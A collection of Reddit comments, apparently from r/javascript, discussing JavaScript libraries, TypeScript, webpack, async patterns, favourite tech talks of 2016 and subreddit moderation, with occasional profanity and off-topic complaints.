I made some changes: http://codepen.io/kLabz/pen/rWoVad?editors=0011 Is this what you wanted?
Engines like V8 should give these out of the box! Actually they should just cram all the top 50 libraries in there.
Strong disagree. Engines should only care about running your JS as fast as computationally possible. All other decisions should be handled upstream. 
And flow/pipe in addition to chain. For example `const kebabCase = pipe(toLowerCase, replace(/\W+/g, ' '), trim, replace(' ', '-'))`. Edit: whoops; supposed to be below the data last curried reply. 
Coercion is something that can also be used to reduce the size of your code so it's a double edged sworld : for example x = "5", x == 5 returns true, in ruby you'd have to write x.to_i It's only bad if you don't learn about it and blame it for your code shortcomings
&gt; best argument against TypeScript is that it appears to encourage an OO approach aren't you a functional purist!
Or honestly, just sign up for a company that provides DID forwarding internationally (www.1pcom.net is the only one I know personally) There. US DID -&gt; Intl DID, no middlemen
Wow , you guys gave me such a confidence boost and Im atually not worried at all now! I know I have to stay focused on my goal and achive it. Thanks! 
Online journalism has a writing click-bait problem
There are definitely risks, yes! The two main use cases for Proxies, AFAIK, are: * Safely executing potentially malicious code (via so-called [membranes](http://exploringjs.com/es6/ch_proxies.html#sec_membranes)), where you need to fence in said code. * Emulating behavior of native APIs (such as the DOM) within JavaScript.
Well take your Free time with a capital F and commit some Accessibility with a capital A to the project. It's free, get over it not being exactly what you paid for.
And it even includes [padLeft](https://vocajs.com/#padLeft) so you don't need to require left-pad anymore!
Typical JS "optimization"
What your trying to do is [natural language processing](https://en.wikipedia.org/wiki/Natural_language_processing) and more specifically [named-entity recognition](https://en.wikipedia.org/wiki/Named-entity_recognition). It's not a trivial problem so you wont get far with only regular expressions. For better results it might be smarter to use existing libraries like [nlp_compromise](http://nlpcompromise.com).
Hey guys! I am developing an open source project called FuseBox. It's a bundler/loader that is blazing fast, requires no configuration to bundle heavy npm modules. It's under development, and I need your input, ideas, suggestions! https://github.com/fuse-box/fuse-box Why do you think?
http://codepen.io/TaimuKo/pen/GNPZzN?editors=1000#0 which shows the form working correctly but then they all appear vertically on a webpage
You would like RxJS.
It's nice to have this library in mind if the need arises and I'm sure the developer has worked very hard on this, but I think doing something like this is just overkill: http://i.imgur.com/wJOAJPf.png ...really? I dislike abstractions that are simply wrappers over the native JavaScript API.
The width of the content area does not properly account for the padding on the &lt;body&gt; or itself. So the content area's &lt;div&gt; ends up overlapping the scrollbar.
I once used linux utility called "sox" to create all kinds of tests with audio. There seems to be node.js interface, which might be worth looking at https://github.com/psaylor/sox-audio
I used it a year ago and did! I'm starting over at a new job and trying not to introduce too much complexity at first. 
Just a teaser or real product?
I've been using TS for the last two years on a pretty large project at work and on a small(ish) hobby project and I can honestly say I'm much happier than I'd be with vanilla JS. TS strikes a nice balance between being useful and getting in your way too much. It's biggest weakness is that in JS development you tend to use *a lot* of 3rd party libraries. And sometimes those have definitions, sometimes they don't (and if they do, the quality can be pretty poor). Related to that, it's a pain to keep the versions in sync. But then again, you'd get that in any language that interfaces heavily with a non-typed language, so you can't blame TS for that.
20kb minified for STRING FUNCTIONS. Most of which you never use in practice. Most of the people that think it's ok to use this would never pass my code review process. Voca is fine as a reference to string functions but there are ZERO cases where this should ever be included as a library. 
We'll start sending invites to early release soon.
Stopped reading this shit when I saw first occurence of "racist", "white" etc. I dont have anything agains any human and race/country shit doesnt matter anything to me, and 95%+ of people doesnt care as well. I just feel it is overused in today world and I dont really need to be constantly reminded every human being has the same laws and should be treated equally. I am feeling like a 5 year old kid when all sites, journals, blogs are constanly reminding me of something obvious. I am using white background theme in my VSCode, I hope I wont be jailed for being racist. Please at least keep IT industry free of this shit talking.
Thanks for looking, I was really stuck trying to find a good or consistent way to format my code, especially when I have a few .filter and .map together or when I need to return an object with a few fields from a function. Is there a common style widely used in JS world?
Good place to start, widely used: https://github.com/airbnb/javascript
If you're happy with what you have, then a build tool could easily just frustrate you. But I'll tell you my webpack story. First, I read that everything is require()-ed into a JS file: JS, PNG's, CSS, you name it. And I thought it was preposterous – what use is CSS in my JavaScript? Then I learned that the style-loader wraps that CSS and chucks it into the page header when the module is loaded. That seemed both awesome and evil at the same time. Back to images. I wanted to do something pretty common: load an image from a service, and default to a fallback if that request failed. You get the usual experience of trying to figure out where that image will be at runtime. By requiring that image through webpack, that image URL was automatically compiled into that file for me – either as a path to a file or a data URL… I didn't need to care. Cool! Then I spent two days tearing out my hair trying to get things *really* working properly. So frustrating. :) After I got all the basics figured out, I learned about code splitting and automatic asynchronous loading of extra chunks. That's awesome all by itself, but now the CSS stuff suddenly made sense. By requiring it in the lazy loaded chunk, I would get free CSS splitting as well! Finally, web workers. Creating them is cumbersome and managing their dependencies is worse. Not with webpack. Toss your worker in a JS file and require() dependencies like anywhere else. Then require() it into other files through a worker loader, instantiate the function you get, and start posting messages. Dead simple. All that to say: it isn't the typical transpile/watch stuff, common to all build tools, that make webpack special to me. It's about easily creating a dependency graph of all types of resources – based on source compile-time location – and being able to trust that those resources will be available at runtime. But note that I'm still A TOTAL webpack newbie. So I don't _really_ know what I'm talking about!
This is really well made! Good job! It even works on my ipad, which is more than I can say for a lot of js demos.
Related to https://github.com/standard-schema/javascript
I replaced both of them but the web page still appears like the imgur link in the other reply 
the second if is much more readable
r/javascript has a focus problem. This article has nothing to do with js itself. It is an option piece about how js developers should treat other developers based on what happened to some people in grade school.
Looks good!
Tablets without an extra keyboard are terrible for writing. I'd rather go with a small laptop.
guess that's personal preference then. the first once clearly resembles the mathematical "5 &lt; num &lt; 10" at a glance, while for the second one is far less obvious to me.
https://www.npmjs.com/package/kontur
This is pretty neat. It reminds me of [hapi's joi](https://github.com/hapijs/joi) library for validation and something like this [joi-to-json-schema](https://github.com/lightsofapollo/joi-to-json-schema) to emit the JSON schema.
The internet has a bullying problem, it's not just one community. That behavior has been condoned and encouraged. 
Very nice!
I like how this thread is throwing a hissyfit because of the fucking version number of a product. 0/10 completely unworkable now.
 const arg2 = { pointToLayer: function (feature, latlng) { return L.circleMarker }, } L.geoJSON(someGeojsonFeature, arg2); For some reason the library chose to have you pass in an Object as opposed to just a function. It's not really padded, you're just passing in a object literal with a function as a property. L.geoJSON looks the same, I don't know how it works but I would assume it has this kind of signature. const L = { //Init Function for Features geoJSON: function(featureName, featureObject) { ... stuff } } You see functions in objects all the time, look at console.log for example. It's the same idea.
OK so I get the what. Why would you do this? What sort of thing is common this is a good pattern for?
Just to add to yurkaninryan's excellent explanation: there's good reason to use an object as parameter, check out [this post](http://www.2ality.com/2011/11/keyword-parameters.html)
Hmmm. I'll be home in about four hours and I'll try to recreate and hopefully solve your issue! Please remind me if I haven't, prone to forgetting! 
I've been using var declaration and getter/setter in the constructor. I've have a class that have a custom creator that automatically make the variable with the visibility required in the constructor. All you have to do is inherit from it and send the var in the proper format to the super(). I had to figure how to do multiple inheritance with Class too that was fun, :X. [edit] why do they need their funky symbols. the keyword private is the obvious choice there, why an unclear #...
thank you for your assistance :)
Slick!
Good code is like a good joke. Commenting is like explaining a joke. 
I think you are driving yourself crazy because you are trying to understand what I normally call "magic" or "pixie dust" in a library just from speculation. The only way to know what's going on with magic is to go right to the source. ^.^
No, not really. I use a few different languages regularly and during my career so far over a dozen. One thing I've noticed about the various C style languages is that it's really easy to fall into a trap where I think of the next one I learn in terms of the previous one because of the superficial resemblances. I really like C#, which I've been using for the last 15 years, and I treat it as the OO focused language it is. But without a doubt the worst JavaScript I've seen comes from Java, C#, and C++ devs who haven't written enough js to actually understand it. And, one of the most common blunders in my opinion is to try to force it into an OO style. 
q. Why did the jQuery developer never have financial problems? a. Because he was in $.noConflict() mode
I might get to love it later, but I have been on it for 1 year, and I'm still missing the cpp. I hope they implement the shared object for worker soon, it would be cool to have a worker than can access the document too... 
That's good to hear. I tested it on my Galaxy Tab, and with Browserstack, and I see it's paid off! 
Write your code with dependency injection. That way it's easier to mock native extension objects. I have no articles to offer but I worked on porting a chrome extension to FF, Safari and opera in the last year. Oh, there's a massive lack of documentation with extensions. Go crazy with exploring 
I stand by this roadmap, especially because I tested so many different free courses online (and subsequently wasted a bunch of time). Hopefully someone will find this useful. **Rithm** (https://www.rithmschool.com/courses) - Awesome for going from 0 to beginner/intermediate; possibly the best fundamentals I've found - Doesn't hand hold so it teaches you how to think - Writing is friendly and understandable **Eloquent JS** (http://eloquentjavascript.net/) - Great for solidifying intermediate - This is when you begin to learn "real" coding - Can be difficult to grasp, but with a solid understanding of the fundamentals, you should be good **Secrets of a JS Ninja** (https://www.amazon.com/Secrets-JavaScript-Ninja-John-Resig/dp/193398869X) - Great for going from intermediate to advanced - If you've methodically mastered the previous two, you will be good. Really deepens your understanding and sharpens skillset Finally, if you supplement all this with **Codewars** (https://www.codewars.com/ , allows you a bunch of puzzles/katas to check your level as you progress; great because you can go back and see how your skills have actually improved, you'll definitely cringe at some of your old code, ha), it's a pretty fucking awesome roadmap to get you from 0 to advanced, though like most things it'll take a lot of work. I've also heard good things about Free Code Camp, though I've only checked it out briefly. Hit me up if you have questions, always down to help others get started.
Sorry for the questions, but I'm trying to understand what's already going on. Looking at the code, am I to assume those power rankings come in from an outside API? If so, then I'd modify your script to read the data point of the image that's coming in, and put a string replacement in to change the image from the outside source that it might pull from with whatever image you want to bring in from your own web space.
this is a third party website. what it allows tho is for a custom css and js file. I had someone help in the past which does some replacing but I am unsure of how to do it in that location of the css. http://www.thegoldenturducken.com/external/all.js is the current JS i am using.
Thank you! :-) How it looks with Safari? Are there some difficulties writing code for safari?
It is crazy, but people have written very nice stuff to make it easier. I'm sure there's some lodash thing for this, but off the top of my head: http://ramdajs.com/docs/#both var gt10 = x =&gt; x &gt; 10; var even = x =&gt; x % 2 === 0; var f = R.both(gt10, even); f(100); //=&gt; true f(101); //=&gt; false not really sure why that example uses a custom function for gt10 when there's also R.gt R.gt(2, 1); //=&gt; true 
will do, thanks!
Good jokes m8 real funny see you at FUCK YOUJ
This still does increase output file size. It is not much, but add this, add lodash _.forEach and many other wrapper functions and KBytes are growing up and up and up. Ps: There is zero reasons to make (15).toString().toUpperCase(). If library is going to to make you save one line of code, for me it is pointless to include it.
It is more readable for "pure" programmers. It's less readable for programmers that are used to math.
It's a /r/dota2 meme. That being said - are you a bot? Your master should add some contact information and a github link then.
Hi /u/danwin, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index). Edit: please [read below](https://www.reddit.com/r/javascript/comments/5ipr99/callback_me_maybe_contemporary_javascript/dba2aus/) for added context!
Under which guideline was it removed?
It implements a different paradigm though, namely, the functional paradigm. You can't compose `String.prototype.toLowerCase` without additional code, where `lowerCase` can easily be composed. For instance, given: let names = ['FOO', 'BAR', 'BAZ']; How would you convert them all to lowercase? Using `String.prototype.toLowerCase` the long way, you'd need to do: names.map(name =&gt; name.toLowerCase()); Using `lowerCase`, it's: names.map(lowerCase); I don't gulp the FP kool-aid, but it is a very clean way of manipulating data.
RAF tries its best to run at 60Hz (1000ms / 60) when the tab has focus. RAF passes the time in as an arg when it is called, keep the current time in a var. Subtract the current timestamp from the last timestamp to see how long of an interval it has been since the previous update. Ignore any deltas more than 1000 / 60 * 3, three times the RAF step speed. Note: Three times your step is just a fudge threshold. You can change it to whatever works for you.
Hi /u/seierstad, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index) (specifically, _Posting: Showing off a Project_). Please use the [Showoff Saturday](https://www.reddit.com/r/javascript/search?sort=new&amp;restrict_sr=on&amp;q=flair%3AShowoff%2BSaturday) posts for these types of submissions.
Voca, like Lodash, is modular. You can cherry-pick the methods you want without having to use the full monolithic build.
The lib also has a chaining API so it makes it more natural to v('hello world') .upperCase() .prune(8) .value() // =&gt; "HELLO..."
Nope, as long as you understand the anatomy of an extension, you should be able to write the same app and only inject browser specific functionality later.
Most of this sub's contributions are opinions. This deals with the experiences of professionals in the field, so I'd say it's as if not more relevant than much of what we see in here. 
This is one of the silliest things I've seen in a long while. Take a simple readable format that devs, BAs, even our SMEs can read and write and make an opinionated library to make it so only devs can use it, with the added bonus of missing features!
BONUS!
JSONSchema gets verbose and unwieldy very quickly though. Schema reuse is a hassle as well. Defining it in compact code seems a interesting idea at least. 
Is it possible for you to put this into a github repository? 
Why create yet another language when you could use something existing like typescript interfaces and leverage existing knowledge and tooling.
Very good point. Does that then mean lots of the other parts of the native API needs to be in there too? Personally I like your first map approach :) ...but I have an array-fetish. 👌🏼
I think there's already a web related project that's called Fusebox. This may cause some confusion, even if that project hasn't been updated in over a year.
quite nice indeed! well done ;) Some questions: - under which license are you releasing the software? LGPL, GPL, Apache, custom one, etc? I do not see such info in your Github repository - what is your experience with Oryx Design Lab? the sprites look quite nice, but their web site is very "limited" (to say the least...). For example, I do not find any info about their "royalty free commercial license". For example, is it legal to have those sprites on Github? (as I guess you did)
Mine was from [Jem Young about future](https://www.youtube.com/watch?v=CRjGt0KfjzE)
Cheng Lou's "On the Spectrum of Abstraction", from React Europe: https://www.youtube.com/watch?v=mVVNJKv9esE . Watch it. Watch it again. It's kinda mind-blowing the first time, but incredibly valuable.
Nice joke but kinda out of context, jQuery is not being used here.
This is by far my favorite talk of all time. Watched it live in Paris, did not get it at all. Watched it twice again at home, and man it blew my mind! Explained so much. (also, confirmed today, [there'll be more](https://twitter.com/_chenglou/status/809496699425038336)!)
Ashley Williams - [A brief history and mishistory of modularity](https://www.youtube.com/watch?v=LfOVyNQK5io)
Videos in this thread: [Watch Playlist &amp;#9654;](http://subtletv.com/_r5iq0bv?feature=playlist) VIDEO|COMMENT -|- [Cheng Lou - On the Spectrum of Abstraction at react-europe 2016](http://www.youtube.com/watch?v=mVVNJKv9esE)|[45](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dba6ru9?context=10#dba6ru9) - Cheng Lou's "On the Spectrum of Abstraction", from React Europe: . Watch it. Watch it again. It's kinda mind-blowing the first time, but incredibly valuable. [André Staltz (@andrestaltz): You will learn RxJS at ng-europe 2016](http://www.youtube.com/watch?v=uQ1zhJHclvs)|[10](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dbabhym?context=10#dbabhym) - André Staltz - You will learn RxJS Reactive programming with Observables can seem like a hard skill to learn. In this talk you will see Andre live code and explain the basics of RxJS Observables in a way that will demystify the concepts. We will bu... [Instant Loading: Building offline-first Progressive Web Apps - Google I/O 2016](http://www.youtube.com/watch?v=cmGr0RszHc8)|[7](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dba5buk?context=10#dba5buk) - Jake Archibald's talk about PWAs was my favorite talk at Google I/O 2016. That was unfortunately the only conference I attended this year. [Nordic.js 2016 • Jem Young - Embracing The Future](http://www.youtube.com/watch?v=CRjGt0KfjzE)|[4](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dba6cvg?context=10#dba6cvg) - Mine was from Jem Young about future [Dan Abramov - The Redux Journey at react-europe 2016](http://www.youtube.com/watch?v=uvAXVMwHJXU)|[3](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dba7xoq?context=10#dba7xoq) - Dan Abramov's "The Redux Journey" from ReactEurope this year. While he did talk about the rise of the library, what he mainly talked about was library design, and how constraints impact features. (and vice versa) Great talk that opened my mind to ... ["Making Impossible States Impossible" by Richard Feldman](http://www.youtube.com/watch?v=IcgmSRJHu_8)|[3](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dbag0m3?context=10#dbag0m3) - Definitely Making Impossible States Impossible by Richard Feldman. It's in Elm, but I think the principle (modelling your state so invalid states can't happen) applies to Redux/React apps as well. [Nordic.js 2016 • Ashley Williams - A brief history and mishistory of modularity](http://www.youtube.com/watch?v=LfOVyNQK5io)|[2](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dba7uzu?context=10#dba7uzu) - Ashley Williams - A brief history and mishistory of modularity [Render 2016 - Lee Byron](http://www.vimeo.com/166790294)|[2](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dbb0fn8?context=10#dbb0fn8) - Lee Byron - Immutable User Interfaces Cheng Lou - On the Spectrum of Abstraction ["Existing in Tech" - View Source Conference Opening Keynote by Lena Reinhard](http://www.youtube.com/watch?v=vpUY_ryWtc8)|[1](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dbaeip2?context=10#dbaeip2) - Existing in tech - the opening keynote at Viewsource [Monktoberfest 2016: Bryan Cantrill - Oral Tradition in Software Engineering](http://www.youtube.com/watch?v=4PaWFYm0kEw)|[1](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dbapc1r?context=10#dbapc1r) - Oral Tradition in Software Engineering - Bryan Cantrill [WebAssembly: birth of a virtual ISA (Ben Smith) - Full Stack Fest 2016](http://www.youtube.com/watch?v=vmzz17JGPHI)|[1](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dbavv2t?context=10#dbavv2t) - Ben Smith on web assembly he gives an accessible summary of the technology. [Brian Lonsdorf - Oh Composable World!](http://www.youtube.com/watch?v=SfWR3dKnFIo&amp;t=971s)|[1](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dbb1g0x?context=10#dbb1g0x) - Brian Lonsdorf - Oh Composable World! Terrific talk. And you can go deeper with his book ( ) and his video series at egghead.io [Visual Studio Live! Austin 2016 General Session: JavaScript and the Rise of the New Virtual Machine](http://www.youtube.com/watch?v=eJV-hqQGZXU)|[1](https://www.reddit.com/r/javascript/comments/5iq0bv/_/dbb2la7?context=10#dbb2la7) - Saw this talk live and it really opened my mind about Javascript. Scott Hanselman - Javascript and the rise of the Virtual Machine I'm a bot working hard to help Redditors find related videos to watch. I'll keep this updated as long as I can. *** [Play All](http://subtletv.com/_r5iq0bv?feature=playlist&amp;ftrlnk=1) | [Info](https://np.reddit.com/r/SubtleTV/wiki/mentioned_videos) | Get me on [Chrome](https://chrome.google.com/webstore/detail/mentioned-videos-for-redd/fiimkmdalmgffhibfdjnhljpnigcmohf) / [Firefox](https://addons.mozilla.org/en-US/firefox/addon/mentioned-videos-for-reddit)
Dan Abramov's "The Redux Journey" from ReactEurope this year. https://www.youtube.com/watch?v=uvAXVMwHJXU While he did talk about the rise of the library, what he mainly talked about was library design, and how constraints impact features. (and vice versa) Great talk that opened my mind to some new thinking about tradeoffs. *(also great, and very related, was [Cheng Lou's talk at the same conference](https://www.reddit.com/r/javascript/comments/5iq0bv/what_is_the_best_tech_talk_you_watch_in_2016/dba6ru9/\)) as posted by /u/acemarke)*
Programming as a career is not going to pop for quite some time. Specific tracks (web apps, mobile apps, etc) may or may not. I don't see either of those two starting to fall off for at least a decade though.
end goal is to get it into a database so i can just build some reports off of it and not have to use daddyleagues
Are you just beginning to learn programming? You read like you are -- no offense. If this is the case, the concepts you learn now will likely apply to whatever type of programming you do in the future. So, no it would not be a bad time to learn javascript. At the risk of being overly idealistic I don't think any time is a bad time to learn any programming language. 
&gt; ... hear in the rumor mill we are in a web app bubble and it will pop and it won't be useful or be a lucrative career at all. Is there some truth to this? No.
JSON schema IS too verbose, which is why I tend to compile it all down to a variable length binary format which I then compress.
I think much of the criticism rise from the following concepts: the native `event loop` and the `libuv` threadpool/event loop for I/O. I would recommend researching these things. ie, "everything runs in one thread this is insane for a server!" Personally, I typically use node as a thin wrapper around a database, and I've never really ran into trouble.
&gt; or when I need to return an object with a few fields from a function Look into `reduce`.
The example would be rejected in a code review, and using locks here is a mistake. The correct way to write it is as follows. async function criticalFunction() { const data = await getDataFromDb(); const modifiedData = await asynchronouslyDoStuffWithData(data); return writeDataBackToDb(modifiedData); } while(true) { await criticalFunction(); } The large example makes me question the usefulness: // Wait for everything to finish await wait(2000); This should never be necessary. Put simply, locks are for resource contentions, not for blocking execution.
Why not just remove .json for .js and return an object?
[xkcd]
Yep. It's easy. 
I just use garage sale abacasuses from retired mathematicians from the 18th century.
Sure but even so it is unwieldy. Detailed schemas in pretty JSON get so verbose. 
Because typescript is the worst, obviously 
I believe JavaScript is at last count the most widely used programming language in the world. Maybe that changes at some point, but right now JS is still on the way up.
Free time. hahahaha good one.
It doesn't actually address js code or documentation. Even arguing about whitespace is technically more relevant.
Literally never a bad time to learn js.
Would it be wise to learn WebASM then?
What are you storing in a database?
Using the prototype gives you some better options for composition/mixins/inheritance/reflection, but yes, you lose the private state. The convention in this case is usually to prefix "private" variables with `_`. As far as performance, are you creating 10k instances per second? If yes, then you'll see a difference in speed and memory consumption (probably not huge but it'll be there, my guess is &lt;= 15% overhead for `this.* = `). If you're not writing "hot" code, you'll never notice and the overhead would be very low in the absence of significant GC pressure. All that being said, `Object.create()` is *massively* slower than `new`, so keep that in mind.
NodeJs is what allows it to run outside the browser (duh!). But more specifically, nodejs is built using the V8 javascript engine used in chrome which allows it to create an environment where javascript can run while giving it access to the functions of the OS which aren't available in the browser (accessing files, etc).
On the backend, node scripts can start, run and finish .. all in one go. Or, like with the browser, they may 'hook' to events and callbacks. Those events could be file IO, waiting for an incoming network connection or even `setTimeout`. 
Existing in tech - the opening keynote at Viewsource https://youtu.be/vpUY_ryWtc8
&gt; Correct me if I'm wrong ... I'd argue that the same code should always execute, without fail, when that event handler is called. There's a reason that it's written asynchronously, and blocking it defeats the purpose. Again, locks are about resource contention, not flow control. Addressing your concern directly, **ideally the async method being called would not need to concern itself with how many times, or how frequently, or in what order, it's actually called; I would argue this is the responsibility of the caller**. As it pertains to events, I believe that, if your code depends on events firing in a particular sequence, then some aspect of the code design needs to be rethought. &gt; ... callbacks that take some time ... Hopefully async callbacks would return immediately so the application can decide what to do next, and the browser can continue processing user input. :)
Can you be more specific? I used reduce multiple times on pretty much every question... 
How would you suggest doing this in js? It doesnt have to be really random for this project. I only need it to be fast. All itll do is randomize how things are displayed, and for this, having an even spread is better than being unpredictable.
&gt; ... MongoDB which I can't lock, manipulate it and write it back to the db. In all honesty, I would likely solve the problem by using a datastore that meets the applications requirements. I'm not too familiar with how Mongo works, but with something like SQL Server, PostgreSQL, and others, you're able to set transaction isolation levels that 1) won't block the table for other readers and writers and 2) guarantees consistency within that transaction. They also support table and row-level locks if absolutely necessary. Obviously I don't know a thing about your application. It sounds data-intensive, or as if data is a primary concern, so I would first consider how the data is stored, read, and written, and architect around that. In my experience, no application-level locks are necessary to read and write consistently if the data store has the necessary mechanisms to ensure data consistency. I've only found them absolutely necessary when writing driver software (lots of resource contention), to be honest, and even then, I'd prefer to avoid them.
Hey, that's a good name. I like where you're going with this. Let's open a GitHub repo for discussion, and get someone on the logo design ASAP.
Oh, my apologies. I did take a brief look at your code, but only `d1.js` and didn't notice your use of reduce in that file. I thought you might not know about it.
DAE Microsoft sucks? 
If you're pressed for time, use what you know. Using jQuery won't hurt you, especially if it's for something small. If you're looking to learn, Vue is great. 
I was thinking the same thing. Calling their product stdlib and especially their CLI tool `lib` is not a good idea. There's just too many conflicts with both names. Also having to put configuration data in to the `package.json` is not cool. Other than that it looks like a fun service. I might try it out. Though, I don't think serving a website is the best use case they could have come up with. 
[removed]
To run node on the server you need to install node.js for your OS and then, assuming you want to use it to develop web apps or APIs, you will need to run a server such as Express. There are many Express tutorials out there if you do a quick search. To host publicly, you will need node.js installed on your public facing server. There are cloud solutions such as Heroku which can greatly simplify hosting and deployment.
As an alternative to a chrome extension you could also run a desktop GUI in a browser tab. This might get you started: https://github.com/prettydiff/schadenfreude
Well done with the tutorial. Some minor things that could be improved: * Movement feels a bit sluggish because the character doesn't respond until you lift up the mouse or the key, effectively introducing a variable delay. I would use mousedown and keydown. * It's a bit jarring that the numbers in the squares are the only non-pixellated graphics * The "obstacles" and how the player interacts with them don't make sense to me. Why do a few skulls on the ground block my way, just like one of the giant blocks that looks like a half coffin, and why does banging into them a few times make them disappear, and possibly drop an item? I would make things that block your way look like obstacles, and things you can destroy look like they are taking damage.
It's really not. Some of it is _lengthy_, but not verbose. Keep in mind that HTML is very closely related, and HTML is hardly verbose. Regardless, my point is less about the specific merits of the languages themselves, and much more about the capabilities and tooling.
Private properties: const CustomThing = (function () { const $ = new WeakMap() function CustomThing () { $.set(this, { buffer: [] }) } CustomThing.prototype.add = function add (foo) { $.get(this).buffer.push(foo) return this } CustomThing.prototype.toString = function toString () { return $.get(this).buffer.toString() } return CustomThing })() const thing = new CustomThing() console.log(thing.add('foo').add('bar').toString())
Yo dog?
&gt; Without webpack we would all have a really hard time to get babel, sourcemaps, hot module reloading, treeshaking and all that other stuff into to our frontend projects. I bet if I shared this with my brother who has been out of the web dev scene for the last 8 years, he would totally think this was a joke. "Ppppfftt!Nobody uses WordPress anymore brah! It's all about shaking trees and hot modules..." 
What am I looking at... ? The readme.md is very lacking in substance.
[Zepto](http://zeptojs.com/)... [Sizzle](https://sizzlejs.com/)...
I updated the slash animation, and it now shows up on anything that is breakable. That's one of those things I meant to fix, but forgot about. As for the font being different - used to have the math font be the same as the rest of the game, but readability was an issue, especially with the division sign. I opted for something that was much easier to read, since that is a pretty important thing for the player to be able to do. I've been using mouseup for movement since the beginning because it made it so that you could press and hold the button down and move way too quickly. I've since added a cooldown to actions, so that shouldn't be an issue anymore, and I'll change it to mousedown and see how that works. Thanks for the feedback!
Thanks for the feedback, that's much appreciated. I suspect the reason of the downvotes is that I don't take a lot of care to properly address the headline in reddit and just use the suggested one. Heuristically I have noticed that could be an issue but since I don't know how to search on Reddit it would be a bigger learning curve to find out. Is it possible to get that kind of information from Reddit search (if the downvoted links used the default headline) as a regular user? It can also be because of the time I post (mostly on weekdays at night on Sydney/Australia timezone). &gt; The JavaScript community doesn't seem to be interested in this kind of things (fundamentals). &gt;&gt; They don't? What evidence do you have for this claim? I have some evidence. Redux, for example, is reinventing [Event Sourcing](http://martinfowler.com/eaaDev/EventSourcing.html). Instead of learning and implementing event sourcing by themselves in their application, people rely on libraries and most of them not even know that Event Sourcing was never supposed to be abstracted away. It's an architecture which should represent the fundamental structure for the core of a system that wants its properties. "Restful" has nothing to do with REST. In fact, most JavaScript people (from Open Source and real life) not even understand what REST is as per [Roy Fielding dissertation](https://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm). I am seeing the internet (and eventually reddit) fostering such confusion. Uncle Bob Martin has this theory based on personal observation that software developers double every 5 years. Today, most of them are doing JavaScript and starting with that. If the community doesn't talk about the real meaning of things, this confusion will thrive. I have been extra careful to not post misleading things, and even when it's potentially misleading I try to post a comment together with the post to generate a discussion ([Here's a recent example](https://www.reddit.com/r/javascript/comments/5i9q4b/meta_programming_in_javascript_part_three_proxies/)). That's the kind of fundamentals I refer, not just the use of frameworks or libraries. &gt; That is an editorial agenda, which you are more than welcomed to have, but which I strive to avoid. My agenda is to fulfill my responsibilities as a moderator, trying to remain neutral in the evolution and application of our guidelines. What would be "being neutral"? Would you consider an article on CQRS or Event Sourcing worth in this sub? If this sub doesn't accept fundamentals that relate to JavaScript development but people don't use, then it will be impossible to actually help the community. Or maybe it would need to have JavaScript examples to match the sub purpose? However, I don't know any article that talks about Event Sourcing, CQRS, REST or w/e using JavaScript examples. That's what I mean when I say the JS community doesn't care about fundamentals. The only way to post that would be from a self-article if there are no resources on the subject.
I was just reading through Uncle Bob's 'Clean Code' book a week or so ago. Seeing some of those concepts expressed using the JavaScript language is a great twist.
I think it depends. Just use what you like if its your own works. Good extensions not lies on the framework but its content. If your time is limited, or it will be complex in the future, a framework maybe a better choice. Otherwise if you want to practice your JS basis, Vanilla JS is good.
[Oral Tradition in Software Engineering - Bryan Cantrill](https://www.youtube.com/watch?v=4PaWFYm0kEw)
Verbose or not, if we all do something the same way, it's far simpler than if we start splintering off many ways to do something. 
&gt; Some kid called her the n-word on the playground, and she kicked his butt — braids, bows, ruffles, and all. So her feelings were hurt and she committed physical battery/assault? I think *she's* the bully.
Good work, bot.
This inspired me to make my own. Here's what I came up with. I think they do the same thing. I could be wrong. Either way, that was fun. http://codepen.io/dgca/pen/WoLzjK?editors=1010
Node seems a lot more stable and reliable than the rest of the JS world. It's also getting very popular as you say. I'm still on my 1st JS project. I really miss static typing. I don't mind JS the language, despite its quirks like implicit type conversions. It has a really terrible standard library that people are forced to augment with questionable libs from npm. The language is getting better every year though. I miss static typing which reduce the mental load of interfaces, and tends to provide inline documentation and function signatures right in the IDE. I miss being able to refactor without a care. Anyone who says "well every single thing should have tests anyway, so it's not a big deal" is living in coockoo land and must spend 90% of their time writing tests, or they live with a false sense of security. By using Typescript, a language by the designer of C#, you can gain back these benefits. It is said (it is known) that any non-trivial project, especially one where you have a team of devs, should be written in TS. 
It may be a bubble, but I don't see it popping . The tech world is standardizing on web tech. Because all the shitheads at MS, Google, Apple, etc., refused to work together and have a common development stack, the shittiest lowest common denominator is dominating, and will for at least the next decade. I think you're safe learning JS. 
X-Post referenced from [/r/threejs](http://np.reddit.com/r/threejs) by /u/roguezer0 [360 Video and Photo Capture in 4K for Three.js](http://np.reddit.com/r/threejs/comments/5ir1oi/360_video_and_photo_capture_in_4k_for_threejs/) ***** ^^I ^^am ^^a ^^bot. ^^I ^^delete ^^my ^^negative ^^comments. ^^[Contact](https://www.reddit.com/message/compose/?to=OriginalPostSearcher) ^^| ^^[Code](https://github.com/papernotes/Reddit-OriginalPostSearcher) ^^| ^^[FAQ](https://github.com/papernotes/Reddit-OriginalPostSearcher#faq)
[removed]
Wow there tiger, WebAsm isn't a replacement for JS. It's solving a completely different problem.
Just use one of the common PRNGs like Xorshift, Mersenne Twister, or even a simple LCG (Linear congruential generator). For what it's worth, most browsers switched to Xorshift128+ recently. &gt; Anyway, how is this function? You've to analyze it with the popular PRNG testing suites like BigCrush to get an idea, but it's probably not very good. With those two loops it's probably also not very fast. Xorshift does very little in comparison: https://en.wikipedia.org/wiki/Xorshift#Example_implementation You can find various PRNG implementations on npm.
yeah i guess thats cool 
Math.random() will give you a [relatively even spread](http://codepen.io/anon/pen/pNqZJO) anyway. It sounds like you just want to use Math.random(), there's no need to do anything fancy to it. 
It's called constructive criticisme. 
Is Vue the new react?
